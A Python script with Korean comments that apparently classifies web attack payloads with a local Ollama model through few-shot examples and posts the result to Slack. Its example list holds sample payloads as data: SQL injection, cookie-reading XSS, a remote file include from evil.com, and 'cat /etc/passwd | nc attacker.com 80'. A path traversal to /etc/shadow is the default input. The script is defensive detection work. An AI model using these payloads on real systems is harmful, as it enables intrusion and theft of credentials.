# attack_classify_and_send_slack.py
import os
import textwrap
from dotenv import load_dotenv
import ollama
from slack_sdk import WebClient
from slack_sdk.errors import SlackApiError

# .env 로드 (스크립트 시작에서 바로)
load_dotenv()

SLACK_TOKEN = os.getenv("SLACK_BOT_TOKEN")
SLACK_CHANNEL = os.getenv("SLACK_CHANNEL")  # 권장: 채널 ID (예: C09DYD...)
OLLAMA_MODEL = os.getenv("OLLAMA_MODEL", "gemma3:12b")
OLLAMA_BASE_URL = os.getenv("OLLAMA_BASE_URL", "http://localhost:11434")

if not SLACK_TOKEN:
    raise SystemExit("오류: .env에 SLACK_BOT_TOKEN을 설정하세요.")
if not SLACK_CHANNEL:
    raise SystemExit("오류: .env에 SLACK_CHANNEL을 설정하세요 (채널 ID 권장).")

# --- examples 정의 ---
examples = [
    {"input": "' OR '1'='1' --", "attack_type": "SQL Injection"},
    {"input": "<script>alert('XSS')</script>", "attack_type": "PHP/HTML Injection (XSS)"},
    {"input": "index.php?page=http://evil.com/shell.php", "attack_type": "Remote File Inclusion (RFI)"},
    {"input": "8.8.8.8; ls -la /", "attack_type": "Command Injection"},
    {"input": "안녕하세요, 로그인하고 싶습니다.", "attack_type": "Normal"},
    {"input": "UNION SELECT user, password FROM users", "attack_type": "SQL Injection"},
    {"input": "<img src=x onerror=alert(document.cookie)>", "attack_type": "PHP/HTML Injection (XSS)"},
    {"input": "cat /etc/passwd | nc attacker.com 80", "attack_type": "Command Injection"}
]

prefix = (
    "다음은 사용자 입력을 보고 웹 공격 유형을 분류하는 예시입니다. "
    "'SQL Injection', 'PHP/HTML Injection (XSS)', 'Command Injection', "
    "'Remote File Inclusion (RFI)', 'Normal' 중 하나로 정확히 분류해주세요.\n\n"
)

# examples -> 텍스트 블록 생성
example_blocks = []
for ex in examples:
    block = f"입력된 페이로드: {ex['input']}\n분류된 공격 유형: {ex['attack_type']}\n---"
    example_blocks.append(block)
examples_text = "\n".join(example_blocks)

# 실제로 분류할 입력 (원하면 환경변수나 인자로 받을 수 있음)
user_input = os.getenv("USER_INPUT", "file=../../../../etc/shadow")

suffix = f"\n입력된 페이로드: {user_input}\n분류된 공격 유형:"
final_prompt = prefix + examples_text + "\n\n" + suffix

# (디버그) 프롬프트 앞부분 출력
print("=== 프롬프트(앞부분) ===")
print(textwrap.shorten(final_prompt, width=1000, placeholder="..."))
print("=========================\n")

# ollama에 질의 (OLLAMA_BASE_URL 사용 필요 시 환경변수 사용)
os.environ["OLLAMA_BASE_URL"] = OLLAMA_BASE_URL

try:
    resp = ollama.chat(
        model=OLLAMA_MODEL,
        messages=[
            {"role": "system", "content": "You are a concise Korean assistant."},
            {"role": "user", "content": final_prompt}
        ],
    )
except Exception as e:
    raise SystemExit(f"Ollama 호출 실패: {e}")

# 응답 파싱 (ollama 버전별 반환 형태가 다를 수 있어 안전하게 처리)
message_text = None
if isinstance(resp, dict):
    if 'message' in resp and isinstance(resp['message'], dict):
        message_text = resp['message'].get('content')
    elif 'choices' in resp and isinstance(resp['choices'], list) and resp['choices']:
        # 다른 형식의 응답 처리
        first = resp['choices'][0]
        if isinstance(first, dict):
            message_text = first.get('message', {}).get('content') or first.get('text')
else:
    # 문자열 반환일 경우
    message_text = str(resp)

if not message_text:
    # 디버그용: 전체 응답 출력
    print("== Ollama 전체 응답 ==")
    print(resp)
    raise SystemExit("Ollama 응답에서 텍스트를 찾을 수 없습니다. 위 전체 응답을 확인하세요.")

print("=== 모델 응답 ===")
print(message_text.strip())
print("=================\n")

# Slack에 전송
client = WebClient(token=SLACK_TOKEN)
post_text = f"*웹 공격 분류 결과*\n입력: `{user_input}`\n결과: {message_text.strip()}"

try:
    response = client.chat_postMessage(channel=SLACK_CHANNEL, text=post_text)
    print("메시지 전송 성공, ts:", response.get("ts"))
except SlackApiError as e:
    print("Slack 전송 실패:", e.response.get("error"))
    print("전체 에러 응답:", e.response)
